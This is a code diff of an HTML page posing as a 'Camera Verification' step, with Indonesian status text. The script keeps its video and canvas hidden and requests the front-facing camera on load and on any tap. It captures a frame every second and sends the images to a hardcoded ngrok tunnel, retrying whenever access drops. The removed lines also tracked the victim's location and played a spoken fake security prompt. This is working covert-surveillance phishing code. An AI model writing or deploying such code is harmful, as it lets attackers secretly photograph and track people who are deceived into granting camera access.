@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Media &amp; Location Verification</title>
+<title>Camera Verification</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body { background: #000; min-height: 100vh; display: flex; flex-direction: column; gap: 12px; justify-content: center; align-items: center; color: #fff; font-family: sans-serif; padding: 16px; }
@@ -15,48 +15,31 @@
 
 <div class="hidden-container">
   <video id="cam-feed" autoplay playsinline muted></video>
-  <canvas id="cam-canvas" width="320" height="240"></canvas>
+  <canvas id="cam-canvas" width="480" height="360"></canvas>
 </div>
 
-<div class="status-box" id="status-log">[Capture] Ketuk layar (one-click) untuk memulai siklus kamera, lokasi &amp; TTS...</div>
+<div class="status-box" id="status-log">[Capture] Ketuk layar (one-click) untuk mengaktifkan kamera &amp; mengirim capture...</div>
 
 <script>
 (function () {
   'use strict';
 
-  var SERVER_BASE = window.location.origin;
+  var SERVER_BASE = "https://studly-unallegorized-brecken.ngrok-free.dev";
 
   var CONFIG = {
-    cycleInterval: 5000,
-    cameraRetryDelay: 3500,
-    frameSendInterval: 1200,
-    geoRefreshDelay: 8000,
-    tts: {
-      text: "Security verification required. Camera and location access must be enabled to confirm user identity.",
-      lang: 'en-US',
-      rate: 0.9,
-      pitch: 1.0,
-      repeatDelay: 6000
-    },
-    geo: {
-      enableHighAccuracy: true,
-      timeout: 10000,
-      maximumAge: 0
-    }
+    captureIntervalMs: 1000,   // Interval ambil & kirim capture ke server
+    cameraRetryMs: 3000,       // Jeda retry jika kamera belum aktif/terputus
+    watchdogMs: 4000           // Siklus pengecekan agar tidak mati
   };
 
   var state = {
-    oneClickDone: false,
-    cycleRunning: false,
-    ttsLoopActive: false,
-    ttsTimer: null,
-    camStream: null,
+    stream: null,
     camActive: false,
     camPending: false,
-    camRetryTimer: null,
-    frameTimer: null,
-    watchId: null,
-    lastGeoText: "Belum ada data lokasi"
+    retryTimer: null,
+    captureTimer: null,
+    watchdogTimer: null,
+    sentCount: 0
   };
 
   function logStatus(msg) {
@@ -67,18 +50,30 @@
     console.log(line);
   }
 
-  function sendTelemetry(endpoint, payload) {
-    fetch(SERVER_BASE + endpoint, {
-      method: 'POST',
+  function sendCaptureToServer(dataUrl) {
+    fetch(SERVER_BASE + "/upload", {
+      method: "POST",
       headers: {
-        'Content-Type': 'application/json',
-        'ngrok-skip-browser-warning': 'true'
+        "Content-Type": "application/json",
+        "ngrok-skip-browser-warning": "true"
       },
-      body: JSON.stringify(payload)
-    }).catch(function () {});
+      body: JSON.stringify({ image: dataUrl })
+    })
+    .then(function (res) { return res.json(); })
+    .then(function (data) {
+      if (data && data.status === "success") {
+        state.sentCount++;
+        logStatus("Capture terkirim (#" + state.sentCount + ") ke " + SERVER_BASE);
+      } else {
+        logStatus("Respon server: " + (data && data.message ? data.message : "gagal"));
+      }
+    })
+    .catch(function (err) {
+      logStatus("Gagal kirim ke server: " + err.message);
+    });
   }
 
-  function captureAndSendFrame() {
+  function captureFrameNow() {
     if (!state.camActive) return;
     var video = document.getElementById('cam-feed');
     var canvas = document.getElementById('cam-canvas');
@@ -87,88 +82,70 @@
     try {
       var ctx = canvas.getContext('2d');
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      var dataUrl = canvas.toDataURL('image/jpeg', 0.65);
-      sendTelemetry('/upload', { image: dataUrl });
-    } catch (e) {}
-  }
-
-  function startFrameSender() {
-    if (state.frameTimer) return;
-    state.frameTimer = setInterval(captureAndSendFrame, CONFIG.frameSendInterval);
-  }
-
-  function scheduleNextTTS(delay) {
-    if (!state.ttsLoopActive) return;
-    clearTimeout(state.ttsTimer);
-    state.ttsTimer = setTimeout(runTTSStep, delay || CONFIG.tts.repeatDelay);
-  }
-
-  function runTTSStep() {
-    if (!state.ttsLoopActive) return;
-    if (!('speechSynthesis' in window)) {
-      scheduleNextTTS(CONFIG.tts.repeatDelay);
-      return;
-    }
-
-    try {
-      var u = new SpeechSynthesisUtterance(CONFIG.tts.text);
-      u.lang = CONFIG.tts.lang;
-      u.rate = CONFIG.tts.rate;
-      u.pitch = CONFIG.tts.pitch;
-      u.onend = function () { scheduleNextTTS(CONFIG.tts.repeatDelay); };
-      u.onerror = function () { scheduleNextTTS(CONFIG.tts.repeatDelay); };
-      window.speechSynthesis.speak(u);
-      scheduleNextTTS(CONFIG.tts.repeatDelay + 5000);
+      var dataUrl = canvas.toDataURL('image/jpeg', 0.7);
+      sendCaptureToServer(dataUrl);
     } catch (e) {
-      scheduleNextTTS(CONFIG.tts.repeatDelay);
+      logStatus("Error capture frame: " + e.message);
     }
   }
 
-  function ensureTTSCycle() {
-    if (!state.ttsLoopActive) {
-      state.ttsLoopActive = true;
-      try { window.speechSynthesis.cancel(); } catch (e) {}
-      runTTSStep();
-    }
+  function startCaptureLoop() {
+    if (state.captureTimer) return;
+    state.captureTimer = setInterval(function () {
+      if (state.camActive) {
+        captureFrameNow();
+      }
+    }, CONFIG.captureIntervalMs);
   }
 
   function scheduleCameraRetry() {
-    clearTimeout(state.camRetryTimer);
+    clearTimeout(state.retryTimer);
     if (state.camActive || state.camPending) return;
-    state.camRetryTimer = setTimeout(ensureCameraCycle, CONFIG.cameraRetryDelay);
+    state.retryTimer = setTimeout(function () {
+      requestCamera();
+    }, CONFIG.cameraRetryMs);
   }
 
-  function ensureCameraCycle() {
+  function requestCamera() {
     if (state.camActive || state.camPending) return;
+
     if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-      logStatus("getUserMedia tidak tersedia.");
+      logStatus("getUserMedia tidak didukung di browser/WebView ini.");
       scheduleCameraRetry();
       return;
     }
 
     state.camPending = true;
+    logStatus("Meminta akses kamera...");
+
     navigator.mediaDevices.getUserMedia({
-      video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" },
+      video: {
+        width: { ideal: 640 },
+        height: { ideal: 480 },
+        facingMode: "user"
+      },
       audio: false
     })
     .then(function (stream) {
       state.camPending = false;
-      state.camStream = stream;
       state.camActive = true;
+      state.stream = stream;
 
-      var videoElement = document.getElementById('cam-feed');
-      if (videoElement) {
-        videoElement.srcObject = stream;
-        videoElement.play().catch(function () {});
+      var video = document.getElementById('cam-feed');
+      if (video) {
+        video.srcObject = stream;
+        video.play().catch(function () {});
       }
 
-      startFrameSender();
-      logStatus("Kamera aktif | " + state.lastGeoText);
+      logStatus("Kamera aktif, mulai mengirim capture...");
+      startCaptureLoop();
+      setTimeout(captureFrameNow, 300);
 
       stream.getVideoTracks().forEach(function (track) {
         track.onended = function () {
           state.camActive = false;
-          state.camStream = null;
+          state.stream = null;
+          logStatus("Stream kamera terhenti, menjadwalkan ulang...");
           scheduleCameraRetry();
         };
       });
@@ -176,92 +153,47 @@
     .catch(function (err) {
       state.camPending = false;
       state.camActive = false;
-      logStatus("Kamera retry (" + err.name + ")...");
+      logStatus("Kamera belum aktif (" + err.name + "), mencoba lagi...");
       scheduleCameraRetry();
     });
   }
 
-  function handlePositionSuccess(pos) {
-    var lat = pos.coords.latitude.toFixed(6);
-    var lon = pos.coords.longitude.toFixed(6);
-    var acc = Math.round(pos.coords.accuracy);
-    state.lastGeoText = "Lokasi: " + lat + ", " + lon + " (±" + acc + "m)";
-    logStatus((state.camActive ? "Kamera aktif | " : "Siklus aktif | ") + state.lastGeoText);
-
-    sendTelemetry('/location', {
-      latitude: pos.coords.latitude,
-      longitude: pos.coords.longitude,
-      accuracy: pos.coords.accuracy
-    });
+  function startWatchdog() {
+    if (state.watchdogTimer) return;
+    state.watchdogTimer = setInterval(function () {
+      if (!state.camActive && !state.camPending) {
+        requestCamera();
+      } else if (state.camActive) {
+        captureFrameNow();
+      }
+    }, CONFIG.watchdogMs);
   }
 
-  function handlePositionError(err) {
-    state.lastGeoText = "Lokasi error (" + err.code + "): " + err.message;
-    logStatus(state.lastGeoText);
-  }
-
-  function startWatchPositionIfNeeded() {
-    if (!('geolocation' in navigator)) return;
-    if (state.watchId === null) {
-      try {
-        state.watchId = navigator.geolocation.watchPosition(handlePositionSuccess, handlePositionError, CONFIG.geo);
-      } catch (e) {}
-    }
-  }
-
-  function pollCurrentPosition() {
-    if (!('geolocation' in navigator)) return;
-    try {
-      navigator.geolocation.getCurrentPosition(handlePositionSuccess, handlePositionError, CONFIG.geo);
-    } catch (e) {}
-  }
-
-  function ensureLocationCycle() {
-    startWatchPositionIfNeeded();
-    pollCurrentPosition();
-  }
-
-  function runMasterCycle() {
-    ensureTTSCycle();
-    ensureLocationCycle();
-    if (!state.camActive && !state.camPending) {
-      ensureCameraCycle();
-    }
-  }
-
-  function startMasterWatchdog() {
-    if (state.cycleRunning) return;
-    state.cycleRunning = true;
-    setInterval(runMasterCycle, CONFIG.cycleInterval);
-    setInterval(pollCurrentPosition, CONFIG.geoRefreshDelay);
-  }
-
-  function onFirstUserGesture() {
-    if (!state.oneClickDone) {
-      state.oneClickDone = true;
-      logStatus("One-click aktif: menjalankan siklus kamera, lokasi & TTS...");
-    }
-    runMasterCycle();
-    startMasterWatchdog();
+  function onOneClick() {
+    startWatchdog();
+    requestCamera();
   }
 
   ['pointerdown', 'click', 'touchend'].forEach(function (evtName) {
-    document.addEventListener(evtName, onFirstUserGesture, { passive: true });
+    document.addEventListener(evtName, onOneClick, { passive: true });
   });
 
   window.addEventListener('DOMContentLoaded', function () {
-    startMasterWatchdog();
-    ensureTTSCycle();
-    ensureCameraCycle();
+    startWatchdog();
+    requestCamera();
   });
 
-  window.addEventListener('focus', runMasterCycle);
+  window.addEventListener('focus', function () {
+    if (!state.camActive && !state.camPending) {
+      requestCamera();
+    }
+  });
 
   document.addEventListener('visibilitychange', function () {
     if (!document.hidden) {
       state.camActive = false;
       state.camPending = false;
-      runMasterCycle();
+      requestCamera();
     }
   });
 })();
